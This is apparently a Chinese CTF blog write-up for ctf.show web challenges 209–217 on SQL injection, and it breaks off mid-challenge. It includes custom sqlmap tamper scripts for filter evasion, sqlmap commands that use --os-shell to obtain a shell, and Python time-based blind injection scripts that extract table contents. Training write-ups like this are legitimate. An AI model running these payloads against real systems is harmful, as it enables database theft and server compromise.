<h2 id="Web209（like和空格2）"><a href="#Web209（like和空格2）" class="headerlink" title="Web209（like和空格2）"></a>Web209（like和空格2）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664177339625-a78b072d-f105-4b80-92ef-ecb5fbdfd49d.png#averageHue=%23f6f6f6&clientId=uc187d69c-ffd4-4&from=paste&height=353&id=u30600e64&name=image.png&originHeight=441&originWidth=1662&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17532&status=done&style=none&taskId=ua209b45f-d4a1-445e-9cf3-18b2d2a701c&title=&width=1329.6" alt="image.png"><br>&#x3D;被过滤了，用like<br>*和空格被过滤了，说明&#x2F;**&#x2F;行不通了，要改一下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x09</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sqlmap输入：<br><code>python .\sqlmap.py -u [http://280f2963-ea32-4c32-be43-e19fea38256c.challenge.ctf.show/api/index.php](http://280f2963-ea32-4c32-be43-e19fea38256c.challenge.ctf.show/api/index.php) --user-agent=sqlmap --referer=ctf.show --safe-url=[http://280f2963-ea32-4c32-be43-e19fea38256c.challenge.ctf.show/api/getToken.php](http://280f2963-ea32-4c32-be43-e19fea38256c.challenge.ctf.show/api/getToken.php) --tamper=space2tab,equaltolike --safe-freq 1 --method=PUT --headers=&quot;Content-Type:text/plain&quot; --data &quot;id=1&quot; </code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664177417662-21f73f46-d998-4a4f-a36b-91e85dc8fc78.png#averageHue=%23161616&clientId=uc187d69c-ffd4-4&from=paste&height=345&id=ub28f3e6f&name=image.png&originHeight=431&originWidth=1465&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52662&status=done&style=none&taskId=u42b1aa2b-bd22-4631-b150-f9b461aa42b&title=&width=1172" alt="image.png"><br>然后慢慢dump库就好了</p>
<h2 id="Web210（base64-reverse）"><a href="#Web210（base64-reverse）" class="headerlink" title="Web210（base64+reverse）"></a>Web210（base64+reverse）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664178111140-9379412c-8f55-4e65-a83b-3a55c3cdbc08.png#averageHue=%23f7f7f7&clientId=uc187d69c-ffd4-4&from=paste&height=374&id=ua7b813e1&name=image.png&originHeight=468&originWidth=1850&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18172&status=done&style=none&taskId=u166b2a89-cb0f-4355-ad65-9bef0f9ee80&title=&width=1480" alt="image.png"><br>编写tamper：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = base64.b64encode(payload[::-<span class="number">1</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        retVal = base64.b64encode(retVal[::-<span class="number">1</span>]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="comment">#加密两次</span></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<p>SQLMAP：<br><code>python .\sqlmap.py -u [http://953455a0-5d6d-4981-9aa2-bf110b51774c.challenge.ctf.show/api/index.php](http://953455a0-5d6d-4981-9aa2-bf110b51774c.challenge.ctf.show/api/index.php) --user-agent=sqlmap --referer=ctf.show --safe-url=[http://953455a0-5d6d-4981-9aa2-bf110b51774c.challenge.ctf.show/api/getToken.php](http://953455a0-5d6d-4981-9aa2-bf110b51774c.challenge.ctf.show/api/getToken.php) --tamper=REVERSEANDBASE64 --safe-freq 1 --method=PUT --headers=&quot;Content-Type:text/plain&quot; --data &quot;id=1&quot;   </code>   </p>
<h2 id="Web211（同上）"><a href="#Web211（同上）" class="headerlink" title="Web211（同上）"></a>Web211（同上）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664178356725-9de2b768-5404-4edf-9519-a16d5ccca344.png#averageHue=%23f7f7f7&clientId=uc187d69c-ffd4-4&from=paste&height=539&id=u90c67417&name=image.png&originHeight=674&originWidth=1860&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26098&status=done&style=none&taskId=u234faad5-a8f2-4018-8faf-a937a49e7ef&title=&width=1488" alt="image.png"><br>多ban了空格，那就改一下脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = space2comment(payload) <span class="comment">#先进行替换</span></span><br><span class="line">    retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = base64.b64encode(payload[::-<span class="number">1</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        retVal = base64.b64encode(retVal[::-<span class="number">1</span>]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">space2comment</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x09</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<p><code>python .\sqlmap.py -u [http://75b998c7-4101-43cc-85f3-edf6b7882b2e.challenge.ctf.show/api/index.php](http://75b998c7-4101-43cc-85f3-edf6b7882b2e.challenge.ctf.show/) --user-agent=sqlmap --referer=ctf.show --safe-url=[http://75b998c7-4101-43cc-85f3-edf6b7882b2e.challenge.ctf.show/api/getToken.php](http://75b998c7-4101-43cc-85f3-edf6b7882b2e.challenge.ctf.show/) --tamper=REVERSEANDBASE64 --safe-freq 1 --method=PUT --headers=&quot;Content-Type:text/plain&quot; --data &quot;id=1&quot;</code></p>
<h2 id="Web212-同上）"><a href="#Web212-同上）" class="headerlink" title="Web212(同上）"></a>Web212(同上）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664178830553-fcee580e-6f54-4d69-bbd4-8e7059219319.png#averageHue=%23f3f3f3&clientId=uc187d69c-ffd4-4&from=paste&height=348&id=ue2ca6015&name=image.png&originHeight=435&originWidth=1238&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16418&status=done&style=none&taskId=u5862829b-fd33-44dd-92d2-b9abf09a75f&title=&width=990.4" alt="image.png"><br>一样的<br><code>python .\sqlmap.py -u [http://9f69ecae-868f-4a32-85ac-e53f2593c660.challenge.ctf.show/api/index.php](http://9f69ecae-868f-4a32-85ac-e53f2593c660.challenge.ctf.show/) --user-agent=sqlmap --referer=ctf.show --safe-url=[http://9f69ecae-868f-4a32-85ac-e53f2593c660.challenge.ctf.show/api/getToken.php](http://9f69ecae-868f-4a32-85ac-e53f2593c660.challenge.ctf.show/) --tamper=REVERSEANDBASE64 --safe-freq 1 --method=PUT --headers=&quot;Content-Type:text/plain&quot; --data &quot;id=1&quot;</code></p>
<h2 id="Web213-–os-shell-结束）"><a href="#Web213-–os-shell-结束）" class="headerlink" title="Web213(–os-shell,结束）"></a>Web213(–os-shell,结束）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664179214266-b5524be8-e5e3-4107-ae8c-c916ef2572b7.png#averageHue=%23f6f6f6&clientId=uc187d69c-ffd4-4&from=paste&height=718&id=ub1e82d7c&name=image.png&originHeight=897&originWidth=1752&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40682&status=done&style=none&taskId=u44daa8f0-d67c-47cb-8066-eede5106ec9&title=&width=1401.6" alt="image.png"><br>让我们体验体验–os-shell，一键获取shell权限<br>SQLMAP：<br><code> python .\sqlmap.py -u [http://f886da03-8117-438d-be7f-a51c91231c7e.challenge.ctf.show/api/index.php](http://f886da03-8117-438d-be7f-a51c91231c7e.challenge.ctf.show/) --user-agent=sqlmap --referer=ctf.show --safe-url=[http://f886da03-8117-438d-be7f-a51c91231c7e.challenge.ctf.show/api/getToken.php](http://f886da03-8117-438d-be7f-a51c91231c7e.challenge.ctf.show/) --tamper=REVERSEANDBASE64 --safe-freq 1 --method=PUT --headers=&quot;Content-Type:text/plain&quot; --data &quot;id=1&quot; --os-shell</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664179250449-dd1944fc-61a5-4ea5-a77e-3a1e202b1c59.png#averageHue=%23101010&clientId=uc187d69c-ffd4-4&from=paste&height=287&id=ud727013f&name=image.png&originHeight=359&originWidth=1382&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19801&status=done&style=none&taskId=ue0c047d3-777f-4e8f-b244-5fc7bb662e8&title=&width=1105.6" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664179257007-e7e41a9e-5e54-402d-a3a2-44c86d41a593.png#averageHue=%231c1c1c&clientId=uc187d69c-ffd4-4&from=paste&height=58&id=u4bc414b1&name=image.png&originHeight=72&originWidth=980&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9905&status=done&style=none&taskId=u5deb39b1-026b-484f-bfc1-e62ecef9d57&title=&width=784" alt="image.png"></p>
<h2 id="Web214（时间盲注开始）"><a href="#Web214（时间盲注开始）" class="headerlink" title="Web214（时间盲注开始）"></a>Web214（时间盲注开始）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664200848886-b9435bf7-66f8-452c-8e5b-cbd96ed8a096.png#averageHue=%23f8f8f8&clientId=u8dd08cb2-d3ef-4&from=paste&height=527&id=u234faf73&name=image.png&originHeight=659&originWidth=1786&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21183&status=done&style=none&taskId=ud5db6332-1633-440e-8458-12dd86efd42&title=&width=1428.8" alt="image.png"><br>在主页（最开始的主页）抓包可以发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664200867056-d22c8fe3-a551-4256-abe7-9466a059eb35.png#averageHue=%23f3f2f2&clientId=u8dd08cb2-d3ef-4&from=paste&height=249&id=uee251f3b&name=image.png&originHeight=311&originWidth=684&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31293&status=done&style=none&taskId=u8f7192f1-f7b6-414e-b53d-8992ecf4c5d&title=&width=547.2" alt="image.png"><br>ip是可注入点，我们写个时间盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#@author：Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://7a58ecfc-246e-4ef7-9fef-1e686149a259.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)//<span class="number">2</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;if(ord(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),1)&quot;查找数据库名字</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;: f&quot;if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,ctfshow_flagx,ctfshow_info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;: f&quot;if(ord(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,id,flaga,info</span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: <span class="string">f&quot;if(ord(substr((select group_concat(flaga) from ctfshow_flagx),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        t1=time.time()</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">1</span>:</span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>或者也可以用sqlmap嗦一嗦：<br><code>python .\sqlmap.py -u [http://7a58ecfc-246e-4ef7-9fef-1e686149a259.challenge.ctf.show/api/index.php](http://7a58ecfc-246e-4ef7-9fef-1e686149a259.challenge.ctf.show/api/index.php) --data &quot;ip=1&amp;debug=1&quot; --referer=[http://7a58ecfc-246e-4ef7-9fef-1e686149a259.challenge.ctf.show/index.php](http://7a58ecfc-246e-4ef7-9fef-1e686149a259.challenge.ctf.show/index.php) --user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&quot; --dbs </code></p>
<h2 id="Web215（同上）"><a href="#Web215（同上）" class="headerlink" title="Web215（同上）"></a>Web215（同上）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=<span class="string">&#x27;http://710b6654-8399-4f36-bf73-190f41836878.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)<span class="comment">//2</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;1&#x27; or if(ord(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;: f&quot;1&#x27;or if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;: f&quot;1&#x27;or if(ord(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)#&quot;,</span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: f<span class="string">&quot;1&#x27;or if(ord(substr((select group_concat(flagaa) from ctfshow_flagxc),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        t1=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        r=requests.<span class="title function_ invoke__">post</span>(url,data=data)</span><br><span class="line">        t2=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">1</span>:</span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        result+=<span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">        <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>也可以用sqlmap，但是貌似会非常慢</p>
<h2 id="Web216（闭合）"><a href="#Web216（闭合）" class="headerlink" title="Web216（闭合）"></a>Web216（闭合）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664203542266-cb842b3d-e756-41a1-8a16-36d227564ae6.png#averageHue=%23f7f7f7&clientId=ud76cdfac-6052-4&from=paste&height=354&id=u719006bc&name=image.png&originHeight=442&originWidth=1462&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9447&status=done&style=none&taskId=u8ee93e94-8b12-4fe7-98ae-2732a34685e&title=&width=1169.6" alt="image.png"><br>这一题前面有个from_base64，这是mysql的base64加密语句<br>要想办法闭合这个，抓包测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664203737589-900b6d73-99dc-43a6-b5f8-cb6064cc7495.png#averageHue=%23f6f6f6&clientId=ud76cdfac-6052-4&from=paste&height=262&id=u52e25d0f&name=image.png&originHeight=328&originWidth=1308&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44992&status=done&style=none&taskId=uaf6d6667-a4b4-443b-8ff0-1e89079c7c4&title=&width=1046.4" alt="image.png"><br>如上payload发现成功延时，MQ&#x3D;&#x3D;就是1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=<span class="string">&#x27;http://41d2de27-e3db-4c3b-aa72-85a6a955e343.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)<span class="comment">//2</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:f<span class="string">&quot;&#x27;MQ==&#x27;) or if(ord(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)#&quot;</span>,</span><br><span class="line">            <span class="comment"># &quot;ip&quot;: f&quot;1&#x27;or if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;: f&quot;1&#x27;or if(ord(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;: f&quot;1&#x27;or if(ord(substr((select group_concat(flagaa) from ctfshow_flagxc),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)#&quot;,</span></span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        t1=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        r=requests.<span class="title function_ invoke__">post</span>(url,data=data)</span><br><span class="line">        t2=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">1</span>:</span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        result+=<span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">        <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>我猜sqlmap貌似不太行？</p>
<h2 id="Web217-sleep过滤）"><a href="#Web217-sleep过滤）" class="headerlink" title="Web217(sleep过滤）"></a>Web217(sleep过滤）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664253648600-b94d0a63-341b-4f66-a9b8-c96976877917.png#averageHue=%23f5f5f5&clientId=u41cadc8f-314e-4&from=paste&height=481&id=ub91faa0e&name=image.png&originHeight=601&originWidth=1536&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18244&status=done&style=none&taskId=u9f6c48cf-4e0b-49b2-b65a-23efd0e84a4&title=&width=1228.8" alt="image.png"><br>过滤了sleep，但是我们不仅仅只有这个函数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664253675243-1ab904ea-8e25-4692-aa41-be3bbf17ffe4.png#averageHue=%23fcfcfb&clientId=u41cadc8f-314e-4&from=paste&height=125&id=u6f6b5f15&name=image.png&originHeight=156&originWidth=1034&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15117&status=done&style=none&taskId=u8ac5e871-4bfd-4d8e-98c2-93f73bddf1f&title=&width=827.2" alt="image.png"><br>在这里我选择benchmark(t,exp)：<br><img 